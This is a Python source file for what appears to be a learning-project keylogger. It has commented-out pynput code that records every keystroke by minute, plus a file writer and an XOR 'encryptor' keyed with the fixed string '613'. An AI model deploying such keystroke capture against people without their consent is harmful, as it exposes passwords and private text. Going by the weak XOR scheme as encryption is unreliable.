





# from datetime import datetime
# import threading
# import sys
# from pynput import keyboard
# from collections import defaultdict

# press_char = defaultdict(list)
# running = True  # To allow clean exit from the program


# def on_press(key):
#     """ Listens for key presses and stores them by minute """
#     try:
#         formatted_date = datetime.now().strftime("%d/%m/%Y %H:%M")
#         if hasattr(key, 'char') and key.char is not None:
#             press_char[formatted_date].append(key.char)
#         else:
#             press_char[formatted_date].append(key.name if hasattr(key, "name") else str(key))
#     except Exception as e:
#         print(f"error: {e}")


# def show_pressed_key():
#     """ Displays all recorded key presses, grouped by minute """
#     if not press_char:
#         print("❌ No data to display.")
#         return
#     print("\n📋 **Recorded Key Presses:**")
#     for minute, keys in sorted(press_char.items()):
#         print(f"🕒 {minute}: \n {', '.join(keys)}")
#     print()


# def command_listener():
#     """ Continuously listens for user commands while key logging continues """
#     global running
#     while running:
#         command = input("📢 Enter command (SHOW / EXIT): ").strip().upper()
#         if command == "SHOW":
#             show_pressed_key()
#         elif command == "EXIT":
#             print("📴 Shutting down the program...")
#             running = False
#             break
#         else:
#             print(f"❌ Unknown command: {command}")


# # 🔴 Start key listener in a separate thread (background)
# listener_thread = threading.Thread(target=lambda: keyboard.Listener(on_press=on_press).start(), daemon=True)
# listener_thread.start()

# # 🔵 Main loop for user commands - this will continue while listener is running
# command_listener()

#RAFI EDIT 




# class Manager:
#     def __init__(self, time_to_run):
#        self.time_to_run = time_to_run # must be in minutes...it'll then iterate through this for 60 second intervals!
#        self.run_key_logger()
    
#     def run_key_logger(self):
#         while self.time_to_run != 0:
#             kl = keylogger()
#             ec = Encryptor(kl)
#             w = Writer(kl)
            # time_to_run -= 1
        
class Writer:
    def __init__(self, data):
        self.data = data
        self.file_name = "key_logger_non_encrypted_file.txt"
        self.write()
 
    def write(self):
        with open(self.file_name, "w") as f:  
            f.write(self.data)





class EncryptorAndDecryptor:
    def __init__(self, data):
        self.data = data
        self.encrypted_file_name = "key_logger_encrypted_file.txt"
        self.decrypted_file_name = "key_logger_non_encrypted_file.txt"
        self.key_word = "613"

    def encrypt(self):
        string = ""
        key_length = len(self.key_word)

        with open(self.decrypted_file_name, "r") as read_file:
            text = read_file.read()  # Read full file content

        # XOR each character with the corresponding key character (cycling through the key)
        for i in range(len(text)):
            string += chr(ord(text[i]) ^ ord(self.key_word[i % key_length]))  #

        with open(self.encrypted_file_name, "w") as f:  # Overwrite to avoid appending errors
            f.write(string)


    def decrypt(self):
        string = ""
        key_length = len(self.key_word)

        with open(self.encrypted_file_name, "r") as read_file:
            encrypted_text = read_file.read()  # Read full encrypted content

        # XOR each character with the corresponding key character (cycling through the key)
        for i in range(len(encrypted_text)):
            string += chr(ord(encrypted_text[i]) ^ ord(self.key_word[i % key_length]))  

        with open(self.decrypted_file_name, "w") as f:  # Overwrite to restore original text
            f.write(string)


